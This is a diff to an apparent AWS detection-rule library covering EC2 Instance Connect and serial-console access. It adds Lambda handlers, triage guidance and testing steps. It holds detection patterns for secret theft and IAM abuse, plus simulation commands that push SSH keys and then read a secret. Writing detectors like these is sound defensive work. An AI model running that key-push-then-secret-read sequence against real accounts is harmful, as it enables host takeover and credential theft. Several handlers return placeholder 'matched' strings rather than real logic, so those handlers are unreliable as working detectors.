@@ -11889,8 +11889,8 @@ def lambda_handler(event, context):
   },
   {
     id: "det-091",
-    title: "EC2 Instance Connect Key Push Followed by Suspicious Activity",
-    description: "High-confidence lateral movement: SendSSHPublicKey then shortly afterward same actor or target host context performs SSM StartSession, GetSecretValue, KMS Decrypt, S3 GetObject, IAM policy modification, or other sensitive API calls.",
+    title: "EC2 Instance Connect Followed by Sensitive Cloud Activity",
+    description: "High-confidence post-access detection for EC2 Instance Connect. This should correlate a key push with later sensitive cloud activity from the same operator identity or access path, using ordered sequence and normalized actor identity rather than loose co-occurrence.",
     awsService: "EC2",
     relatedServices: ["SSM", "Secrets Manager", "KMS", "S3", "IAM"],
     severity: "Critical",
@@ -11916,9 +11916,9 @@ detection:
       - PutUserPolicy
       - AttachRolePolicy
       - PutRolePolicy
-  condition: 1 of selection_*
+  condition: selection_push
 level: critical
-# Full correlation (actor, 15 min) requires SIEM.`,
+# Full correlation requires ordered sequence and stable actor identity across the access and follow-on activity.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=ec2-instance-connect.amazonaws.com AND eventName=SendSSHPublicKey) OR (eventName=StartSession OR eventName=GetSecretValue OR eventName=Decrypt OR eventName=AssumeRole OR eventName=CreateAccessKey OR eventName=PutUserPolicy OR eventName=AttachRolePolicy OR eventName=PutRolePolicy))
 | eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
@@ -11951,18 +11951,97 @@ ORDER BY e.push_time DESC`,
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSSHPublicKey"] } }, null, 2),
+      lambda: `"""
+EC2 Instance Connect Followed by Sensitive Cloud Activity
+Trigger: EventBridge rule matching SendSSHPublicKey.
+Use for: Correlation from EC2 Instance Connect to later sensitive cloud activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ec2-instance-connect.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "SendSSHPublicKey":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-instance-connect-plus-sensitive-activity-correlation",
+        "alert": {
+            "rule_id": "det-091",
+            "title": "EC2 Instance Connect Followed by Sensitive Cloud Activity",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "instance_id": detail.get("requestParameters", {}).get("instanceId"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and SendSSHPublicKey time.", "Review sequence: key push → sensitive API within 15 min.", "Verify if follow-on activity was from the session."],
-    testingSteps: ["Push key, then perform GetSecretValue or StartSession within 15 min.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the actor, target instance, and exact time of the EC2 Instance Connect event.", "Review ordered follow-on activity such as secrets access, role chaining, IAM mutation, or additional host-access events within 15 minutes.", "Determine whether the same normalized operator identity performed the post-access activity and whether the target host context makes the sequence expected."],
+    testingSteps: ["Push a temporary SSH key to a test instance, then perform `GetSecretValue`, `AssumeRole`, or IAM policy modification within 15 minutes.", "Verify both the access event and later sensitive API activity appear in CloudTrail.", "Run the detector and confirm it requires ordered correlation rather than simple grouping by ARN."],
+    lifecycle: {
+      whyItMatters: "Interactive host access becomes significantly more suspicious when it is followed immediately by sensitive cloud control-plane activity. This sequence is often the clearest sign that EC2 Instance Connect was used operationally rather than for routine troubleshooting.",
+      threatContext: {
+        attackerBehavior: "An attacker may open shell access to a workload through EC2 Instance Connect and then pivot into secrets retrieval, credential creation, IAM changes, or other sensitive cloud actions.",
+        realWorldUsage: "This pattern is practical because EC2 Instance Connect provides fast host access while the subsequent cloud actions expose what the operator actually did after gaining a foothold.",
+        whyItMatters: "The strongest signal is an ordered post-access sequence, not just the presence of one access event and one sensitive API somewhere nearby.",
+        riskAndImpact: "If missed, defenders may view the access event and later cloud abuse as unrelated activity rather than one intrusion chain.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EC2 Instance Connect", "AWS CloudTrail management events for Secrets Manager, STS, IAM, SSM, and other sensitive services"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.instanceId", "sourceIPAddress"],
+        loggingRequirements: ["EC2 Instance Connect and follow-on management events must be ingested into the same analytics environment.", "Actor identity should be normalized across direct and assumed-role sessions.", "The detection engine must support ordered short-window correlation."],
+        limitations: ["CloudTrail cannot confirm what commands ran inside the SSH session.", "Simple actor-only aggregation can be noisy in shared admin contexts.", "Some legitimate operations may legitimately involve post-access sensitive APIs, especially on administration hosts."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Primary actor performing the key push or later cloud action" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "requestParameters.instanceId", normalizedPath: "cloud.instance.id", notes: "Target host for interactive access" },
+          { rawPath: "follow_on.eventName", normalizedPath: "related.event.action", notes: "Sensitive action following the access event" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["authentication"], type: ["start"], action: "SendSSHPublicKey", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          cloud: { instance: { id: "i-0abc123" } },
+          related: { event: { action: "GetSecretValue" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Stable Actor Identity", description: "Normalize direct and assumed-role identities so the access actor can be matched to later cloud operations.", examples: ["IAM user", "assumed ops role"], falsePositiveReduction: "Improves correlation fidelity across role hops." },
+        { dimension: "Target Host Context", description: "Resolve what kind of host received the key push and what privileges or credentials it is likely to expose.", examples: ["prod bastion", "application host", "ephemeral build worker"], falsePositiveReduction: "Helps explain why post-access cloud actions are significant." },
+        { dimension: "Follow-On Activity Class", description: "Group later actions into secrets access, role chaining, IAM mutation, or other abuse classes.", examples: ["GetSecretValue", "AssumeRole", "CreateAccessKey"], falsePositiveReduction: "Makes the post-access sequence easier to triage and prioritize." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a short-window post-access sequence: an operator uses EC2 Instance Connect and then performs sensitive cloud actions soon afterward. It should require ordered correlation and stable identity, not merely two suspicious events from the same broad user namespace.",
+        conditions: ["first eventSource equals ec2-instance-connect.amazonaws.com and eventName equals SendSSHPublicKey", "second event is a sensitive cloud API by the same normalized actor identity", "follow-on activity occurs within 15 minutes"],
+        tuningGuidance: "1. Require event order. 2. Normalize actor identity across direct and assumed-role use. 3. Escalate further when the access target is sensitive or the actor was not approved for EC2 Instance Connect in the first place.",
+        whenToFire: "Fire when EC2 Instance Connect is followed quickly by sensitive cloud activity from the same operator identity.",
+      },
+      simulationCommand: "aws ec2-instance-connect send-ssh-public-key --instance-id i-0abc123 --instance-os-user ec2-user --ssh-public-key file://id_rsa.pub --availability-zone us-east-1a && aws secretsmanager get-secret-value --secret-id ExampleSecret",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium depending on admin workflows and actor-target context",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because the window between access and abuse is short.",
+        considerations: ["This is one of the strongest EC2 Instance Connect detections in the set.", "Ordered correlation and stable identity normalization are critical."],
+      },
+    },
   },
 
   // --- EC2 Serial Console Access ---
   {
     id: "det-092",
     title: "Serial Console SSH Public Key Sent",
-    description: "Baseline visibility for serial console access attempts. Serial console is generally rarer and more sensitive than ordinary EC2 Instance Connect because it bypasses network controls and requires account-level enablement.",
+    description: "Baseline visibility for serial console access. Serial console is rarer and generally higher risk than standard EC2 Instance Connect because it bypasses normal network paths and often appears during deep recovery, break-glass, or potentially adversarial host access.",
     awsService: "EC2",
     relatedServices: [],
     severity: "High",
@@ -11992,16 +12071,95 @@ ORDER BY eventTime DESC`,
 | filter eventName = "SendSerialConsoleSSHPublicKey"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSerialConsoleSSHPublicKey"] } }, null, 2),
+      lambda: `"""
+Serial Console SSH Public Key Sent
+Trigger: EventBridge rule matching SendSerialConsoleSSHPublicKey.
+Use for: Baseline visibility into serial console access.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ec2-instance-connect.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "SendSerialConsoleSSHPublicKey":
+        return {"matched": False}
+
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-092",
+            "title": "Serial Console SSH Public Key Sent",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "instance_id": detail.get("requestParameters", {}).get("instanceId"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "sourceIPAddress", "userAgent", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSerialConsoleSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and target instance.", "Verify if serial console access was authorized.", "Serial console bypasses security groups; treat as high-signal."],
-    testingSteps: ["Call SendSerialConsoleSSHPublicKey.", "Verify CloudTrail captures the event.", "Run the detection."],
+    investigationSteps: ["Identify the actor, target instance, and source IP associated with the serial-console access event.", "Verify whether serial console was enabled and approved for this host or environment.", "Check for later recovery, credential, or persistence activity that might explain or elevate the access."],
+    testingSteps: ["Use `SendSerialConsoleSSHPublicKey` against a test instance in an account where serial console is enabled.", "Verify CloudTrail captures the event and target context.", "Run the baseline rule and confirm it records the access without relying on actor heuristics."],
+    lifecycle: {
+      whyItMatters: "Serial console access is one of the highest-signal host-access events available in AWS because it reaches instances below the usual network path and is comparatively rare in many environments.",
+      threatContext: {
+        attackerBehavior: "An attacker with sufficient permissions may use serial console access to recover or manipulate a host even when normal network paths are restricted or unavailable.",
+        realWorldUsage: "Serial console is often reserved for incident response, recovery, or deep troubleshooting, which makes unexpected use highly significant.",
+        whyItMatters: "The access event itself is valuable because it indicates intent to interact with a host at a lower level than ordinary SSH administration.",
+        riskAndImpact: "If missed, defenders may overlook some of the most sensitive interactive host access in the environment.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EC2 Instance Connect", "EC2 inventory and serial-console configuration context"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.instanceId", "sourceIPAddress", "userAgent"],
+        loggingRequirements: ["CloudTrail must ingest SendSerialConsoleSSHPublicKey events.", "The environment should know which accounts and instances permit serial console access.", "Actor identity should be normalized across IAM users and assumed roles."],
+        limitations: ["The event shows key delivery, not the full set of actions taken through the serial session.", "Some legitimate recovery operations may generate this event under stressful operational conditions.", "Serial console availability depends on account and instance configuration."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor requesting serial console access" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "requestParameters.instanceId", normalizedPath: "cloud.instance.id", notes: "Target instance receiving serial-console access" },
+          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Source IP of the operator" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["authentication"], type: ["start"], action: "SendSerialConsoleSSHPublicKey", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/admin", type: "IAMUser" },
+          cloud: { instance: { id: "i-0abc123" } },
+          source: { ip: "203.0.113.10" },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Serial Console Eligibility", description: "Determine whether serial console is expected or enabled for the target environment.", examples: ["approved recovery account", "ordinary application account"], falsePositiveReduction: "Helps distinguish routine recovery from unexpected low-level access." },
+        { dimension: "Target Criticality", description: "Resolve the target instance to workload sensitivity and business importance.", examples: ["production bastion", "domain services host"], falsePositiveReduction: "Prioritizes access to high-value systems." },
+        { dimension: "Operator Context", description: "Understand whether the actor belongs to a recovery, SRE, or incident-response workflow.", examples: ["IR break-glass role", "unapproved app role"], falsePositiveReduction: "Improves triage around legitimate emergency usage." },
+      ],
+      logicExplanation: {
+        humanReadable: "This should remain a broad visibility rule for every successful serial-console key push. It establishes the baseline that stronger unauthorized-actor, sensitive-target, and post-access correlation detections depend on.",
+        conditions: ["eventSource equals ec2-instance-connect.amazonaws.com", "eventName equals SendSerialConsoleSSHPublicKey", "errorCode is absent"],
+        tuningGuidance: "1. Keep the event match broad. 2. Resolve target and operator context immediately. 3. Use separate detections for unauthorized actors, sensitive targets, and post-access behavior.",
+        whenToFire: "Fire on every successful serial-console access event for visibility.",
+      },
+      simulationCommand: "aws ec2-instance-connect send-serial-console-ssh-public-key --instance-id i-0abc123 --serial-port 0 --ssh-public-key file://id_rsa.pub",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium because serial-console usage is often rare",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because serial-console access is immediately actionable.",
+        considerations: ["This is the feeder rule for the stronger serial-console detections.", "Account and instance configuration context are useful enrichments."],
+      },
+    },
   },
   {
     id: "det-093",
-    title: "Serial Console Access by Unexpected Actor",
-    description: "Detects serial console access initiated by identities that should not troubleshoot instances at this depth. Suspicious actors include IAM users outside infra/platform roles, application roles, and non-admin assumed roles.",
+    title: "Serial Console Access Outside Authorized Recovery Path",
+    description: "Detects serial-console use by identities outside approved recovery, infrastructure, or incident-response workflows. This should rely on explicit actor authorization and session provenance rather than role-name substring allowlists.",
     awsService: "EC2",
     relatedServices: [],
     severity: "High",
@@ -12017,18 +12175,7 @@ detection:
   selection:
     eventSource: ec2-instance-connect.amazonaws.com
     eventName: SendSerialConsoleSSHPublicKey
-  filter_known:
-    userIdentity.arn|contains:
-      - '/role/Admin'
-      - '/role/Platform'
-      - '/role/Infra'
-      - '/role/Ops'
-      - '/user/admin'
-    userIdentity.sessionContext.sessionIssuer.arn|contains:
-      - '/role/Admin'
-      - '/role/Platform'
-      - '/role/Infra'
-  condition: selection and not filter_known
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2-instance-connect.amazonaws.com eventName=SendSerialConsoleSSHPublicKey
 | where NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Infra%") OR like(userIdentity.arn, "%/role/Ops%") OR like(userIdentity.arn, "%/user/admin%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Admin%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Platform%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Infra%"))
@@ -12047,19 +12194,97 @@ ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.instanceId, sourceIPAddress
 | filter eventSource = "ec2-instance-connect.amazonaws.com"
 | filter eventName = "SendSerialConsoleSSHPublicKey"
-| filter userIdentity.arn not like /\\/role\\/(Admin|Platform|Infra|Ops)/ and userIdentity.arn not like /\\/user\\/admin/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSerialConsoleSSHPublicKey"] } }, null, 2),
+      lambda: `"""
+Serial Console Access Outside Authorized Recovery Path
+Trigger: EventBridge rule matching SendSerialConsoleSSHPublicKey.
+Use for: Real-time authorization checks for serial-console access.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ec2-instance-connect.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "SendSerialConsoleSSHPublicKey":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-authorized-serial-console-actor-check",
+        "alert": {
+            "rule_id": "det-093",
+            "title": "Serial Console Access Outside Authorized Recovery Path",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "instance_id": detail.get("requestParameters", {}).get("instanceId"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.instanceId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSerialConsoleSSHPublicKey", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for serial console.", "Update allowlist if legitimate."],
-    testingSteps: ["As a non-infra role, call SendSerialConsoleSSHPublicKey.", "Verify detection triggers."],
+    investigationSteps: ["Identify the direct actor, session issuer, and workflow provenance behind the serial-console event.", "Verify whether this identity is explicitly authorized for recovery or serial-console operations on the target environment.", "Determine whether the access came from an approved incident-response, SRE, or break-glass workflow or from an unexpected principal."],
+    testingSteps: ["As a non-approved identity, call `SendSerialConsoleSSHPublicKey` against a monitored test instance.", "Verify CloudTrail captures the actor and session provenance fields needed for authorization checks.", "Run the detector and confirm it uses explicit principal inventories instead of role-name text matching."],
+    lifecycle: {
+      whyItMatters: "Serial console is too powerful and sensitive to be broadly accessible. When an unapproved identity uses it, the event is a strong sign of abuse, control-plane misuse, or ungoverned recovery access.",
+      threatContext: {
+        attackerBehavior: "An attacker operating through a compromised IAM identity or role may use serial console to bypass ordinary access controls and regain influence over a host.",
+        realWorldUsage: "Serial console access is attractive in scenarios where the attacker wants deeper host access than normal remote administration provides.",
+        whyItMatters: "Authorization context is more important than whether the actor's ARN contains operations-like words.",
+        riskAndImpact: "If missed, unauthorized operators may gain powerful low-level host access under the guise of recovery operations.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EC2 Instance Connect", "Authorized recovery and serial-console principal inventory", "EC2 environment and workload ownership inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.instanceId", "sourceIPAddress"],
+        loggingRequirements: ["SendSerialConsoleSSHPublicKey events must be ingested with full userIdentity context.", "The environment should maintain exact principals allowed to use serial console.", "Actor-to-environment or actor-to-host scope should be resolvable."],
+        limitations: ["Without principal inventories this rule becomes a weak anomaly detector.", "Emergency break-glass access needs to be modeled explicitly.", "The event does not prove what the actor did once serial-console access was established."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Primary actor requesting serial-console access" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role or identity source" },
+          { rawPath: "requestParameters.instanceId", normalizedPath: "cloud.instance.id", notes: "Target host for serial-console access" },
+          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Source IP of the actor" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["authentication"], type: ["start"], action: "SendSerialConsoleSSHPublicKey", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session", type: "AssumedRole" },
+          cloud: { instance: { id: "i-0abc123" } },
+          source: { ip: "203.0.113.10" },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Authorized Recovery Actors", description: "Exact inventory of identities allowed to use serial console by environment or workload class.", examples: ["SRE break-glass role", "IR recovery role"], falsePositiveReduction: "Replaces brittle role-name allowlists." },
+        { dimension: "Session Provenance", description: "Determine whether the actor arrived through an approved SSO, incident-response, or emergency workflow.", examples: ["approved IR federation", "unexplained app-role session"], falsePositiveReduction: "Improves trust assessment of the access path." },
+        { dimension: "Target Scope", description: "Model which hosts or environments each recovery actor may access.", examples: ["prod fleet only", "sandbox only"], falsePositiveReduction: "Prevents broad allowlists from masking unauthorized target access." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect serial-console access outside approved recovery paths. It should match `SendSerialConsoleSSHPublicKey`, resolve the actor and session provenance, and then check whether that principal is explicitly allowed to use serial console on the target host or environment.",
+        conditions: ["eventSource equals ec2-instance-connect.amazonaws.com", "eventName equals SendSerialConsoleSSHPublicKey", "actor is not in the approved serial-console inventory or actor is outside approved target scope or request lacks approved workflow provenance"],
+        tuningGuidance: "1. Use exact actor inventories. 2. Model actor-to-environment scope, not only global allowlists. 3. Treat break-glass access as a separate approved path with strong auditing.",
+        whenToFire: "Fire when serial console is used by an identity outside approved recovery or incident-response workflows.",
+      },
+      simulationCommand: "aws ec2-instance-connect send-serial-console-ssh-public-key --instance-id i-0abc123 --serial-port 0 --ssh-public-key file://id_rsa.pub --profile dev-user",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with actor inventories and scope controls; high with role-name heuristics",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with actor and asset inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because unauthorized serial-console access is immediately actionable.",
+        considerations: ["This is the actor-centric serial-console detector.", "Principal inventory and scope modeling are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-094",
     title: "Serial Console Access to Sensitive Target",
-    description: "Detects serial console access to critical instances. Serial console on sensitive instances is especially dangerous because it bypasses ordinary network controls. Target matching uses instance ID patterns or naming conventions.",
+    description: "Detects serial-console access to hosts classified as sensitive, such as production, identity, secrets, or break-glass infrastructure. This should depend on resolved asset classification, not instance identifier text matching.",
     awsService: "EC2",
     relatedServices: [],
     severity: "Critical",
@@ -12075,18 +12300,7 @@ detection:
   selection:
     eventSource: ec2-instance-connect.amazonaws.com
     eventName: SendSerialConsoleSSHPublicKey
-  filter_target:
-    requestParameters.instanceId|contains:
-      - 'prod'
-      - 'Prod'
-      - 'production'
-      - 'dc'
-      - 'domain'
-      - 'bastion'
-      - 'secrets'
-      - 'breakglass'
-      - 'privileged'
-  condition: selection and filter_target
+  condition: selection
 level: critical`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2-instance-connect.amazonaws.com eventName=SendSerialConsoleSSHPublicKey
 | where like(requestParameters.instanceId, "%prod%") OR like(requestParameters.instanceId, "%Prod%") OR like(requestParameters.instanceId, "%production%") OR like(requestParameters.instanceId, "%dc%") OR like(requestParameters.instanceId, "%domain%") OR like(requestParameters.instanceId, "%bastion%") OR like(requestParameters.instanceId, "%secrets%") OR like(requestParameters.instanceId, "%breakglass%") OR like(requestParameters.instanceId, "%privileged%")
@@ -12095,24 +12309,101 @@ level: critical`,
 FROM cloudtrail_logs
 WHERE eventSource = 'ec2-instance-connect.amazonaws.com'
   AND eventName = 'SendSerialConsoleSSHPublicKey'
-  AND (requestParameters.instanceId LIKE '%prod%' OR requestParameters.instanceId LIKE '%Prod%' OR requestParameters.instanceId LIKE '%production%' OR requestParameters.instanceId LIKE '%dc%' OR requestParameters.instanceId LIKE '%domain%' OR requestParameters.instanceId LIKE '%bastion%' OR requestParameters.instanceId LIKE '%secrets%' OR requestParameters.instanceId LIKE '%breakglass%' OR requestParameters.instanceId LIKE '%privileged%')
 ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.instanceId, sourceIPAddress
 | filter eventSource = "ec2-instance-connect.amazonaws.com"
 | filter eventName = "SendSerialConsoleSSHPublicKey"
-| filter requestParameters.instanceId like /prod|dc|domain|bastion|secrets|breakglass|privileged/i
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSerialConsoleSSHPublicKey"] } }, null, 2),
+      lambda: `"""
+Serial Console Access to Sensitive Target
+Trigger: EventBridge rule matching SendSerialConsoleSSHPublicKey.
+Use for: Real-time sensitive-target checks for serial-console access.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ec2-instance-connect.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "SendSerialConsoleSSHPublicKey":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-sensitive-serial-console-target-check",
+        "alert": {
+            "rule_id": "det-094",
+            "title": "Serial Console Access to Sensitive Target",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "instance_id": detail.get("requestParameters", {}).get("instanceId"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSerialConsoleSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { instanceId: "i-prod-db-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the target instance and its sensitivity.", "Verify if serial console access was authorized.", "Serial console bypasses security groups; treat as critical."],
-    testingSteps: ["Push serial console key to an instance with 'prod' in its identifier.", "Verify detection triggers."],
+    investigationSteps: ["Resolve the target instance to its environment, owner, and sensitivity classification.", "Verify whether the actor was approved to use serial console on that target class.", "Review whether later recovery or privilege-affecting activity followed the access on the sensitive system."],
+    testingSteps: ["Push a serial-console key to a test instance that is classified as sensitive in inventory, such as a production bastion or identity-related host.", "Verify CloudTrail records the target instance and actor context.", "Run the detector and confirm it keys on asset classification rather than instance ID naming patterns."],
+    lifecycle: {
+      whyItMatters: "Serial-console access to sensitive hosts is one of the most severe interactive-access events in AWS. These systems often carry privileged trust, direct data access, or break-glass significance.",
+      threatContext: {
+        attackerBehavior: "An attacker may target bastions, identity systems, secrets-facing hosts, or production infrastructure through serial console to bypass normal access controls and gain privileged influence.",
+        realWorldUsage: "Sensitive hosts are natural targets because serial-console access can provide recovery-style control even when standard remote administration is constrained.",
+        whyItMatters: "The signal comes from what the target is, not whether its identifier includes operational keywords.",
+        riskAndImpact: "If missed, unauthorized low-level access to crown-jewel infrastructure can quickly lead to credential theft, persistence, or service disruption.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EC2 Instance Connect", "EC2 asset inventory and sensitivity classification"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.instanceId", "sourceIPAddress", "userAgent"],
+        loggingRequirements: ["Serial-console events must be ingested with target context.", "The environment should maintain sensitivity or workload classification for EC2 instances.", "Instance ownership and environment metadata should be available for enrichment."],
+        limitations: ["Without asset inventory the rule cannot reliably determine target sensitivity.", "CloudTrail does not prove whether the serial session was used successfully afterward.", "Some sensitive hosts may legitimately be accessed during controlled recovery events."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.instanceId", normalizedPath: "cloud.instance.id", notes: "Target instance receiving serial-console access" },
